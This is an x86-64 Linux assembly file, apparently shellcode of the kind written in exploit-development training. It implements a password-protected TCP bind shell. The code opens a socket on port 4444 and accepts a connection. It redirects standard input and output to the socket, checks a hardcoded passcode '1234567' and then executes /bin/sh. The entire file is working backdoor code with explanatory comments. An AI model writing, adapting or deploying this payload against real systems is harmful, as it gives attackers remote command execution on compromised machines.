global _start

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	xor rdx,rdx
	syscall
	
	; copy socket descriptor to rdi for future use 

	mov rdi, rax

	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor r9,r9
	push r9
	mov r9w,0x5c11
	shl r9,16
	xor r9b,0x2
	push r9

	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	mov rsi, rsp
	push 49
	pop rax
	push 16
	pop rdx
	syscall

	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	push 50
	pop rax
	push 2
	pop rsi
	syscall

	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	push 43
	pop rax
	sub rsp, 16
	mov rsi, rsp
	mov byte [rsp-1], 16
	sub rsp, 1
	mov rdx, rsp
	syscall

	; store the client socket description 
	mov r9, rax

	; close parent
	push 3
	pop rax
	syscall

	; duplicate sockets

	; dup2 (new, old)
	mov rdi, r9
	push 33
	pop rax
	xor rsi,rsi
	syscall

	push 33
	pop rax
	push 1
	pop rsi
	syscall

	push 33
	pop rax
	push 2
	pop rsi
	syscall

	; Authentication with password "1234567"

	; read passcode
	xor rax,rax
	xor rdi,rdi
	push rax
	push rax
	mov rsi,rsp
	push 16
	pop rdx
	syscall

	; compare the inputted string with "1234567\n"
	mov rcx,rax
	mov rdi,rsi
	mov rbx,0x0a37363534333231
	push rbx
	mov rsi,rsp
	repe cmpsb
	jnz wrong_pwd

	; execve stack-method

	xor r9,r9
	push r9 ; NULL register
	mov rbx, 0x68732f6e69622f2f
	push rbx
	mov rdi, rsp
	push r8
	mov rdx, rsp
	push rdi
	mov rsi, rsp
	push 59
	pop rax
	syscall

wrong_pwd:
	nop
